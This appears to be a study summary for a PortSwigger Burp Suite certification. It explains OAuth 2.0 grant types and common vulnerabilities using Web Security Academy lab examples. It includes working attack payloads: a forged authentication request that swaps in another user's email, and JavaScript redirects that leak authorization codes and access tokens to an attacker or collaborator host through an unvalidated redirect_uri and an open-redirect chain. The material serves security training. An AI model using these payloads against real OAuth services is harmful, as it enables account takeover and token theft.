##### PortSwigger BurpSuite Certification Summary
# OAuth 2.0
OAuth is a service that grants a client application access to a subset of a resource owner's data. The data is stored on the OAuth service provider and access is granted by the user, after an application requested it.
These are the common steps:
 * The client application requests access to a subset of the user's data, specifying which grant type they want to use and what kind of access they want. 
 * The user is prompted to log in to the OAuth service and explicitly give their consent for the requested access.
 *  The client application receives a unique access token that proves they have permission from the user to access the requested data. Exactly how this happens varies significantly depending on the grant type. 
 * The client application uses this access token to make API calls fetching the relevant data from the resource server. 

The grant type specifies the exact steps in the process. They are also referred to as OAuth flows. The most common are "authorization code" and "implicit".

The scope defines on what subset of the data the acces is requested for and can vary strongly between differend services:
```
scope=contacts
scope=contacts.read
scope=contact-list-r
scope=https://oauth-authorization-server.com/auth/scopes/user/contacts.readonly
```
### Authorization Code 
This grant type uses secure channels to communicate the secrets and user data and is considered very secure.

1. Authorization request:
  ```
  GET /authorization?
  client_id=12345&
  redirect_uri=https://client-app.com/callback
  &response_type=code
  &scope=openid%20profile
  &state=ae13d489bd00e3c24 HTTP/1.1
  Host: oauth-authorization-server.com   
  ```
 Noteworthy is the `redirect_uri` which is often used in an attack. It is also referred to as callback URI or callback endpoint. The `state` can be seen as a CSRF token.
2. User login and consent. Once the user logs in, the session usually remains.
3. Authorization code grant
   In this step, the callback is made. The request will contain the authorization code.
4. Access token request
   The client requests a token from the endpoint over a secure channel.
5. Access token grant.
6. 6. API call
   With the `Authorization: Bearer xxxxx` the application can now make API calls.
7. Resource grant.

### Implicit
With this grant type, the token is given immediately after the user gives consent. This type is far less secure, since all communication happens over browser redirects. 

## OAuth authentication
OAuth is often used to authenticate users so they do not have to create a separate account. The flow remains the same, while the data is used to authenticate the user. Here the access token is mainly used instead of a password.

### Example:
The application uses an implicit flow and sends some user information from the OAuth process to it's own backend. With this, a logged in user will be redirected directly to the main account page.
```
POST /authenticate HTTP/1.1
Host: ac021fc91f7f7a56c0883683008e0094.web-security-academy.net
Cookie: session=LyqhX1Ct6DGuQjSqkym07VzcnkAVjx5Q
{"email":"carlos@carlos-montoya.net","username":"wiener","token":"nsIvzvg0iO63USs63h-Mz-UqvptxI-rPIE0s6_qgu-y"}
```
Here the email has been exchanged and the rest is from a valid session of `wiener`. The backend still accepts this and redirects the user to the account associated with the email address and not the token.

It is important to check which API endpoint the client uses. There is plenty of documentation available and it is advisable to make standard requests to get more information about the data structure:
```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```

### Example:
The OAuth service sends an authentication token to the redirect uri in case the user is already logged into the social media account:
```
GET /auth?
client_id=bl0fq2yoggbbcilg0j82y
&redirect_uri=https://HOST/oauth-callback
&response_type=code
&scope=openid%20profile%20email HTTP/1.1
Host: oauth-aca51fcf1ee77020c03404a702aa0050.web-security-academy.net
Cookie: _session=8OiRT37irZ6XH4brmuEG9; _session.legacy=8OiRT37irZ6XH4brmuEG9

---------------------------------------------------------------------------------
HTTP/1.1 302 Found
Redirecting to <a href="https://HOST/oauth-callback?
code=rnGpjv4BFbSvIv7KrHPrTlorjgYMruPNbi_NXD1NT9f">
```

If the service fails to validate the supplied `redirect_uri` , the attacker can craft a malicious URL which discloses the authentication token:
```
<script>
location = "https://oauth-HOST/auth?
client_id=bl0fq2yoggbbcilg0j82y
&redirect_uri=https://COLLABORATOR
&response_type=code
&scope=openid%20profile%20email"
</script>
```

`redirect_uri` [filter bypass strategies](https://portswigger.net/web-security/oauth#leaking-authorization-codes-and-access-tokens).

Sometimes changing one parameter can affect the validation of others. For example, changing the `response_mode` from `query` to `fragment` can sometimes completely alter the parsing of the `redirect_uri`, allowing you to submit URIs that would otherwise be blocked. Likewise, if you notice that the `web_message` response mode is supported, this often allows a wider range of subdomains in the `redirect_uri`.

Even if no external site can be smuggled in as the redirect URI, path traversal might offer a solution. Other places on the website that are passing the filter and have a vulnerability can then be used to get the data of interest. 

### Example
The redirect URI allows only to go to the /oauth-callback endpoint. However, an open redirect vulnerability on the same domain can be obused and reached via directory traversal:
```
GET /auth
?client_id=...
&redirect_uri=https://.../oauth-callback/../post/next?path=ATTACKER-HOST
...
```
The victim will finish the oauth process and then be redirected to the attacker host, with the authorization token in the hash of the URL. It can be accessed like this:
```
document.location.hash.substr(1)
```
The `substr` removes the # symbol, which would strip the values from the URL in subsequent requests, such as to the collaborator:
```
<script>
if (!document.location.hash) {
    window.location = '.../auth?client_id=...&redirect_uri=../oauth-callback/../post/next?path=../exploit/&...'
} else {
    window.location = 'collaborator?'+document.location.hash.substr(1)
}
</script>
```

Note: sometimes the API key is hidden, but queried from the oauth service. Such requests can be impersonated with the authorization token as well.